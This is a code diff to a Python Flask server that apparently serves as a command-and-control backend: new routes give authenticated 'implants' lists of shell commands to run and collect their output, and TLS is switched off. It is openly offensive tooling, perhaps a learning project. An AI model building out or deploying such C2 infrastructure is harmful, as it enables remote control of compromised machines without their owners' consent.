@@ -165,6 +165,53 @@ def register_agent(): # --> this is a handler
 
     return jsonify({"status": "ok", "message": "Welcome!"})
 
+@app.route('/get_task', methods=['POST'])
+def get_task():
+    """
+        listens to the /task route
+        When an implant asks for a new task, this function will query the database
+        and see if the client has issued any task to that specific agent
+        If so, return the task (a list of commands) in a json format
+        If not, return an empty json (or something else)
+    """
+    data = request.json ## getting a request from task route
+    agent_id = data["agent_id"] ## need to verify agent_id 
+    password = data["password"] ## and password 
+
+    if verify_agent_password(agent_id, password):
+        print(f"[+] agent {agent_id} has nothing to do. Give it a job!")
+        agent = find_agent_by_id(agent_id)
+
+        ### FOR TESTING PURPOSES ###
+        task = {"task": "run_command", "commands": ["whoami", "ping 8.8.8.8"], "status": "ok"} 
+        ### FOR TESTING PURPOSES ###
+
+        return jsonify(task)
+    else:
+        print("[-] the agent has failed to authenticate")
+        return jsonify({"status": "authentication failed"})
+    
+@app.route('/task_results', methods=['POST'])
+def task_results():
+    """
+        listens to the /task_results route
+        When an implant sends back the results of a task, this function will store the results
+        in the database
+    """
+    data = request.json
+    agent_id = data["agent_id"]
+    password = data["password"]
+    results = data["results"]
+
+    if verify_agent_password(agent_id, password):
+        print(f"[+] agent {agent_id} has successfully completed the task")
+        print(f"[+] here are the results: {results}")
+        agent = find_agent_by_id(agent_id)
+        return jsonify({"status": "ok"})
+    else:
+        print("[-] the agent has failed to authenticate")
+        return jsonify({"status": "authentication failed"})
+
 @app.route("/")
 def login():
     return render_template("login.html")
@@ -216,7 +263,8 @@ def dashboard():
 
 if __name__ == '__main__':
     # HTTPS uses TLS (SSL) to encrypt normal HTTP requests and responses
-    app.run(ssl_context='adhoc') # run with TLS encryption 
+    # app.run(ssl_context='adhoc') # run with TLS encryption 
+    app.run()
 
 
 
